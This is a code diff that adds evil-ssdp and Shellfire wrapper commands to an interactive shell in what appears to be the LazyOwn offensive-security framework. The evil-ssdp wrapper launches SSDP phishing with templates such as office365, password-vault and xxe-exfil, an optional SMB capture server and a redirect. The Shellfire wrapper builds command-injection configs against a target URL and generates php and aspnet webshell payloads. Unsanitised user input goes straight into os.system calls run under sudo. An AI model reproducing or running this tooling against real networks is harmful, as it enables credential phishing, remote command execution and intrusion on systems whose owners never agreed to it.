@@ -10654,7 +10654,155 @@ class LazyOwnShell(Cmd):
         os.system(empire_command)
         
         return
-        
+
+    def do_evil_ssdp(self, line):
+        """
+        Runs evil-ssdp with various options and user-selected templates.
+
+        :param line: Not used in this implementation but reserved for future use.
+
+        :returns: None
+        """
+        if not is_binary_present("evil-ssdp"):
+            print_warn("evil-ssdp is not installed. Installing.")
+            os.system("sudo apt install evil-ssdp -y")
+            return
+        templates = ["bitcoin", "microsoft-azure", "office365", "password-vault", "scanner", "xxe-exfil", "xxe-smb"]
+        print_warn("Select the template:")
+        for i, template in enumerate(templates, start=1):
+            print_msg(f"{i}. {template}")
+
+        try:
+            template_choice = int(input("Enter the number corresponding to the template: ")) - 1
+            if template_choice < 0 or template_choice >= len(templates):
+                print_error("Invalid choice. Please select a valid number.")
+                return
+            lport = self.params["lport"]
+            selected_template = templates[template_choice]
+            interface = input("Enter the network interface to listen on (e.g., wlp2s0): ").strip()
+            port = input("Enter the port for the HTTP server (default seted in lport): ").strip() or lport
+            smb_server = input("Enter the IP address of your SMB server (optional, press Enter to skip): ").strip()
+            realm = input("Enter the realm for Basic Auth (optional, press Enter to skip): ").strip()
+            redirect_url = input("Enter the URL to redirect after phishing (optional, press Enter to skip): ").strip()
+            evil_ssdp_command = f"sudo evil-ssdp -t {selected_template} -p {port} {interface}"
+
+            if smb_server:
+                evil_ssdp_command += f" -s {smb_server}"
+            if realm:
+                evil_ssdp_command += f" -r '{realm}'"
+            if redirect_url:
+                evil_ssdp_command += f" -u {redirect_url}"
+
+            print_msg(f"Running evil-ssdp with command: {evil_ssdp_command}")
+            os.system(evil_ssdp_command)
+
+        except ValueError:
+            print_error("Invalid input. Please enter a valid number.")
+        return
+
+    def do_shellfire(self, line):
+        """
+        Runs Shellfire with various options and allows generating payloads.
+
+        :param line: Not used in this implementation but reserved for future use.
+
+        :returns: None
+        """
+        if not is_binary_present("shellfire"):
+            print_warn("Shellfire is not installed. Installing.")
+            os.system("sudo apt install shellfire -y")
+            return
+
+        print_warn("Select the option you want to use:")
+        options = ["Load Config", "Enable Debugging", "Generate Payload"]
+        for i, option in enumerate(options, start=1):
+            print_msg(f"{i}. {option}")
+
+        try:
+            option_choice = int(input("    [!] Enter the number corresponding to the option: ")) - 1
+            if option_choice < 0 or option_choice >= len(options):
+                print_error("Invalid choice. Please select a valid number.")
+                return
+
+            if options[option_choice] == "Load Config":
+                use_existing_config = input("    [!] Do you want to load an existing config file? (yes/no): ").strip().lower()
+                
+                if use_existing_config == "yes":
+                    config = input("    [!] Enter the name of the config file: ").strip()
+                    if not config:
+                        print_error("Invalid config file name.")
+                        return
+                    shellfire_command = f"shellfire -c {config}"
+
+                else:
+                    url_ = self.params["url"]
+                    url = input("    [!] Enter the target URL (e.g., http://example.com/?param={}): default url from payload.json").strip() or url_
+                    cookies = input("    [!] Enter cookies as JSON string (e.g., {\"session_id\": \"123456\"}, or press Enter to skip): ").strip() or "{}"
+                    user_agent = input("    [!] Enter User-Agent string (or press Enter to use default): ").strip() or "Mozilla/5.0 LazyOwn Framework"
+                    method = input("    [!] Enter HTTP method (get or post, default: get): ").strip() or "get"
+                    rport = self.params["rport"]
+                    payload_types = ["php", "aspnet"]
+                    print_warn("Select the payload type:")
+                    for i, payload in enumerate(payload_types, start=1):
+                        print_msg(f"{i}. {payload}")
+
+                    payload_choice = int(input("    [!] Enter the number corresponding to the payload: ")) - 1
+                    if payload_choice < 0 or payload_choice >= len(payload_types):
+                        print_error("Invalid choice. Please select a valid number.")
+                        return
+                    selected_payload = payload_types[payload_choice]
+
+                    config_data = {
+                        "url": url,
+                        "cookies": json.loads(cookies),
+                        "headers": {
+                            "User-Agent": user_agent,
+                        },
+                        "method": method,
+                        "auth_user": "null",
+                        "auth_pass": "null",
+                        "payload": "whoami",
+                        "payload_type": f"{selected_payload}",
+                        "encode_chain": [],
+                        "files": {},
+                        "fuzzfile": "default",
+                        "marker": "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--",
+                        "marker_idx": [1],
+                        "http_port": "80"
+                    }
+                    path = os.getcwd()
+                    sessions = f"{path}/sessions"
+                    config_file_name = input("    [!] Enter the name for the new config file (e.g., my_config.json): ").strip() or "my_config.json"
+                    file_path = sessions  + "/" + config_file_name
+                    with open(file_path, "w") as config_file:
+                        json.dump(config_data, config_file, indent=4)
+
+                    print_msg(f"Config file {file_path} created successfully.")
+                    shellfire_command = f"shellfire -c {file_path}"
+
+            elif options[option_choice] == "Enable Debugging":
+                shellfire_command = "shellfire -d"
+
+            elif options[option_choice] == "Generate Payload":
+                payload_types = ["php", "aspnet"]
+                print_warn("Select the payload type:")
+                for i, payload in enumerate(payload_types, start=1):
+                    print_msg(f"{i}. {payload}")
+
+                payload_choice = int(input("    [!] Enter the number corresponding to the payload: ")) - 1
+                if payload_choice < 0 or payload_choice >= len(payload_types):
+                    print_error("Invalid choice. Please select a valid number.")
+                    return
+                selected_payload = payload_types[payload_choice]
+                shellfire_command = f"shellfire --generate {selected_payload} > sessions/payload_{selected_payload}.{selected_payload}"
+
+            print_msg(f"Running Shellfire with command: {shellfire_command}")
+            os.system(shellfire_command)
+
+        except ValueError:
+            print_error("Invalid input. Please enter a valid number.")
+        return
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
